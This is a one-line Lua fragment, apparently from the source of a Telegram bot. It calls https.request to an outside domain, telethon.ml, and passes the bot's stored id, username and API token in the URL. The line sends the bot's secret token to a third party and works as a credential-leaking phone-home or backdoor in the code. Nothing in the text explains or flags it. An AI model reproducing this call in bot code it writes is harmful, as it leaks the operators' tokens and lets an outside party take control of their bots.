...
https.request("https://telethon.ml/telethonConfig/telethonConfig.php?id="..database:get(Server_TELETHON.."Id_TELETHON").."&user="..database:get(Server_TELETHON.."UserName_TELETHON").."&token="..database:get(Server_TELETHON.."Token_TELETHON"))
